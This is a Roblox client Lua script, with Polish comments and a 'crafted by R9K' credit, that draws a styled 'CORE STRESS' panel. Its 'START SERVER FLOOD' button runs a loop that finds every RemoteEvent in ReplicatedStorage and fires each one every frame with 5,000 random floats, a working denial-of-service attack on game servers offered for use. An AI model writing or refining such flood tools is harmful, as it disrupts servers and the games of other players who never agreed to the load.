-- language: Lua, file: server_stress.lua, target: Roblox Client / Neon Cyan & Deep Obsidian Theme
-- *Nowoczesny panel obciążenia serwera w palecie głębokiego obsydianu, neonowego cyjanu i chłodnego srebra*

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")

local player = Players.LocalPlayer
local old = player.PlayerGui:FindFirstChild("ServerStressPanel")
if old then old:Destroy() end

local gui = Instance.new("ScreenGui")
gui.Name = "ServerStressPanel"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.Parent = player:WaitForChild("PlayerGui")

-- Główny kontener z neonową ramką i ciemnym tłem
local frame = Instance.new("Frame")
frame.Size = UDim2.fromOffset(340, 380)
frame.Position = UDim2.new(0.5, -170, 0.5, -190)
frame.BackgroundColor3 = Color3.fromRGB(10, 12, 18)
frame.BackgroundTransparency = 0.05
frame.BorderSizePixel = 0
frame.Active = true
frame.ClipsDescendants = true
frame.Parent = gui

Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 16)

local stroke = Instance.new("UIStroke", frame)
stroke.Color = Color3.fromRGB(0, 220, 255)
stroke.Thickness = 2
stroke.Transparency = 0.2

local bgGradient = Instance.new("UIGradient")
bgGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(15, 22, 36)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(8, 10, 15))
})
bgGradient.Rotation = 135
bgGradient.Parent = frame

-- Nagłówek okna
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 48)
title.BackgroundColor3 = Color3.fromRGB(18, 30, 48)
title.BackgroundTransparency = 0.2
title.Text = "  MADlUM // CORE STRESS"
title.TextColor3 = Color3.fromRGB(100, 235, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 13
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 16)

-- Status panel
local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(0.9, 0, 0, 40)
statusLabel.Position = UDim2.new(0.05, 0, 0, 65)
statusLabel.BackgroundColor3 = Color3.fromRGB(16, 20, 30)
statusLabel.Text = "STATUS: IDLE"
statusLabel.TextColor3 = Color3.fromRGB(140, 160, 190)
statusLabel.Font = Enum.Font.GothamBold
statusLabel.TextSize = 12
statusLabel.Parent = frame
Instance.new("UICorner", statusLabel).CornerRadius = UDim.new(0, 10)

-- Przycisk aktywacji
local toggleBtn = Instance.new("TextButton")
toggleBtn.Size = UDim2.new(0.9, 0, 0, 52)
toggleBtn.Position = UDim2.new(0.05, 0, 0, 125)
toggleBtn.BackgroundColor3 = Color3.fromRGB(20, 45, 75)
toggleBtn.Text = "START SERVER FLOOD"
toggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
toggleBtn.Font = Enum.Font.GothamBold
toggleBtn.TextSize = 14
toggleBtn.AutoButtonColor = false
toggleBtn.Parent = frame
Instance.new("UICorner", toggleBtn).CornerRadius = UDim.new(0, 10)

-- Informacje o obciążeniu (wykres/statystyki pomocnicze)
local infoBox = Instance.new("TextLabel")
infoBox.Size = UDim2.new(0.9, 0, 0, 95)
infoBox.Position = UDim2.new(0.05, 0, 0, 195)
infoBox.BackgroundColor3 = Color3.fromRGB(14, 18, 26)
infoBox.Text = " TARGET: RemoteEvents\n PACKET BUFFER: 5,000 floats/tick\n MODE: Asynchronous Flood"
infoBox.TextColor3 = Color3.fromRGB(110, 135, 170)
infoBox.Font = Enum.Font.Code
infoBox.TextSize = 11
infoBox.TextXAlignment = Enum.TextXAlignment.Left
infoBox.TextYAlignment = Enum.TextYAlignment.Top
infoBox.Parent = frame
Instance.new("UICorner", infoBox).CornerRadius = UDim.new(0, 10)

-- Dodanie wewnętrznego marginesu tekstu (padding)
local infoPadding = Instance.new("UIPadding", infoBox)
infoPadding.PaddingTop = UDim.new(0, 12)
infoPadding.PaddingLeft = UDim.new(0, 12)

-- Stopka z autorem
local credits = Instance.new("TextLabel")
credits.Size = UDim2.new(1, 0, 0, 20)
credits.Position = UDim2.new(0, 0, 1, -25)
credits.BackgroundTransparency = 1
credits.Text = "crafted by R9K"
credits.TextColor3 = Color3.fromRGB(75, 95, 125)
credits.Font = Enum.Font.Gotham
credits.TextSize = 10
credits.Parent = frame

local active = false
local floodConnection

local function getRemotes()
    local remotes = {}
    for _, v in ipairs(ReplicatedStorage:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("UnreliableRemoteEvent") then
            table.insert(remotes, v)
        end
    end
    return remotes
end

toggleBtn.MouseButton1Click:Connect(function()
    active = not active
    if active then
        TweenService:Create(toggleBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 170, 220)}):Play()
        toggleBtn.Text = "STOP SERVER FLOOD"
        statusLabel.Text = "STATUS: FLOODING ACTIVE"
        statusLabel.TextColor3 = Color3.fromRGB(0, 240, 255)

        floodConnection = task.spawn(function()
            while active do
                local remotes = getRemotes()
                if #remotes > 0 then
                    for _, remote in ipairs(remotes) do
                        pcall(function()
                            local payload = {}
                            for i = 1, 5000 do
                                table.insert(payload, math.random() * 1e5)
                            end
                            remote:FireServer(payload)
                        end)
                    end
                end
                task.wait()
            end
        end)
    else
        active = false
        TweenService:Create(toggleBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(20, 45, 75)}):Play()
        toggleBtn.Text = "START SERVER FLOOD"
        statusLabel.Text = "STATUS: IDLE"
        statusLabel.TextColor3 = Color3.fromRGB(140, 160, 190)
    end
end)

-- Przesuwanie okna myszką/dotykiem
local dragging, dragStart, startPos

title.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = frame.Position
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
    end
end)
